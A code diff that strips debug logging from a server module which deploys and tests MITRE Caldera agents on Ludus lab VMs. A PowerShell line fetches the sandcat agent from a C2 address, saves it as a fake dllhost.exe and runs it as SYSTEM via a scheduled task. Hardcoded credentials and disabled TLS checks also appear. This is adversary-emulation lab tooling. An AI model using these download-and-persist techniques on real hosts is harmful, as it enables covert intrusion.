@@ -10,12 +10,10 @@ const VM_DEFS = {
 }
 
 function sendStatus(ws, step, status, message) {
-  console.log(`[server] sendStatus step=${step} status=${status} "${message}"`)
   ws.send(JSON.stringify({ type: "testAbilityStatus", step, status, message }))
 }
 
 async function apiCall(ludusUrl, apiKey, path) {
-  console.log(`[server] Ludus API call: GET ${ludusUrl}${path}`)
   const res = await fetch(`${ludusUrl}${path}`, {
     headers: { "Content-Type": "application/json", "X-API-KEY": apiKey },
     tls: { rejectUnauthorized: false },
@@ -26,7 +24,6 @@ async function apiCall(ludusUrl, apiKey, path) {
 }
 
 async function calderaRest(method, body) {
-  console.log(`[server] Caldera ${method} /api/rest index=${body.index}`)
   const res = await fetch(`${CALDERA_URL}/api/rest`, {
     method,
     headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
@@ -39,7 +36,6 @@ async function calderaRest(method, body) {
 }
 
 async function calderaApi(method, path, body) {
-  console.log(`[server] Caldera ${method} ${path}`)
   const opts = {
     method,
     headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
@@ -53,7 +49,6 @@ async function calderaApi(method, path, body) {
 }
 
 async function sshRun(host, user, pass, command) {
-  console.log(`[server] SSH run: ssh ${user}@${host} — ${command.slice(0, 80)}${command.length > 80 ? "..." : ""}`)
   const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
   if (result.exitCode !== 0) {
     const stderr = result.stderr.toString().trim()
@@ -63,7 +58,6 @@ async function sshRun(host, user, pass, command) {
 }
 
 async function winrmRun(host, user, pass, command) {
-  console.log(`[server] WinRM run: ${user}@${host} — ${command.slice(0, 80)}${command.length > 80 ? "..." : ""}`)
   const py = `
 import winrm
 s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
@@ -95,40 +89,32 @@ async function installWinPrereq(ip, script) {
 }
 
 async function getCalderaAgents() {
-  console.log("[server] getCalderaAgents() — fetching agent list")
   return calderaRest("POST", { index: "agents" })
 }
 
 async function deploySandcatWindows(ip, group) {
-  console.log(`[server] deploySandcatWindows(ip=${ip}, group=${group})`)
-
   const dlCmd = `powershell -Command "$url='http://10.1.99.1:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`
   await winrmRun(ip, "localuser", "password", dlCmd)
 
   const taskName = `CalderaSandcat-${group}`
   const taskCmd = `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://10.1.99.1:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`
   await winrmRun(ip, "localuser", "password", taskCmd)
-  console.log(`[server] scheduled task ${taskName} started as SYSTEM`)
-}
+  }
 
 async function killAllAgents() {
-  console.log("[server] killAllAgents() — removing stale agents")
   try {
     const agents = await getCalderaAgents()
     for (const a of agents) {
       try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
     }
-    console.log(`[server] killAllAgents() — removed ${agents.length} agents`)
-  } catch {}
+    } catch {}
 }
 
 async function killWindowsSandcat(ip) {
-  console.log("[server] killWindowsSandcat() — stopping dllhost processes on Windows")
   try {
     await winrmRun(ip, "localuser", "password",
       'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'DONE\'"')
   } catch {}
-  console.log("[server] killWindowsSandcat() — cleaning up stale scheduled tasks")
   try {
     await winrmRun(ip, "localuser", "password",
       'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
@@ -136,12 +122,10 @@ async function killWindowsSandcat(ip) {
 }
 
 async function waitForCaldera(timeoutMs = 120000) {
-  console.log(`[server] waitForCaldera(timeoutMs=${timeoutMs})`)
   const start = Date.now()
   while (Date.now() - start < timeoutMs) {
     try {
       await calderaRest("POST", { index: "agents" })
-      console.log("[server] Caldera API is ready")
       return
     } catch {}
     await new Promise(r => setTimeout(r, 1000))
@@ -150,13 +134,11 @@ async function waitForCaldera(timeoutMs = 120000) {
 }
 
 async function waitForAgent(group, timeoutMs = 60000) {
-  console.log(`[server] waitForAgent(group=${group}, timeoutMs=${timeoutMs})`)
   const start = Date.now()
   while (Date.now() - start < timeoutMs) {
     const agents = await getCalderaAgents()
     const agent = agents.find(a => a.group === group)
     if (agent) {
-      console.log(`[server] agent found: paw=${agent.paw} group=${agent.group} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)}`)
       if (!agent.trusted) throw new Error(`Agent ${agent.paw} is not trusted — planner will silently skip it, chain will be empty`)
       return agent
     }
@@ -168,19 +150,13 @@ async function waitForAgent(group, timeoutMs = 60000) {
 
 
 async function exploitAbility(paw, abilityId, rewrittenCommand) {
-  console.log(`[server] exploitAbility(paw=${paw}, abilityId=${abilityId})`)
-
   const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
   const modified = structuredClone(original)
   modified.executors[0].command = rewrittenCommand
-  console.log(`[server] exploitAbility: command set to "${rewrittenCommand.slice(0, 60)}..."`)
-
   await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
 
   try {
     const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw, ability_id: abilityId, obfuscator: "plain-text" })
-    console.log(`[server] exploitAbility: exploit result=${JSON.stringify(exploitResult)}`)
-
     const start = Date.now()
     while (Date.now() - start < 120000) {
       const agents = await getCalderaAgents()
@@ -189,24 +165,20 @@ async function exploitAbility(paw, abilityId, rewrittenCommand) {
       const links = agent.links || []
       const mine = links.find(l => l.ability?.ability_id === abilityId)
       if (mine) {
-        console.log(`[server] exploitAbility: link id=${mine.id} status=${mine.status} finish=${mine.finish}`)
         if (mine.finish != null) {
           const facts = mine.facts || []
           return { facts, status: mine.status, linkId: mine.id }
         }
-        console.log(`[server] exploitAbility: link pending, waiting...`)
-      }
+        }
       await new Promise(r => setTimeout(r, 2000))
     }
     throw new Error("Link did not appear within 120s")
   } finally {
     await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, original)
-    console.log(`[server] exploitAbility: command restored`)
-  }
+    }
 }
 
 export async function testAbility(ludusUrl, apiKey, data, ws) {
-  console.log(`[server] testAbility() entry — data:`, JSON.stringify(data.data))
   let group = null
   let winVm = null
   let agentPaw = null
@@ -322,7 +294,6 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
 
     sendStatus(ws, "complete", "success", `Ability "${name}" tested successfully`)
   } catch (err) {
-    console.log(`[server] testAbility caught error: ${err.message}`)
     sendStatus(ws, "cleanup", "running", "Cleaning up on error...")
     try {
       try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }) } catch {}
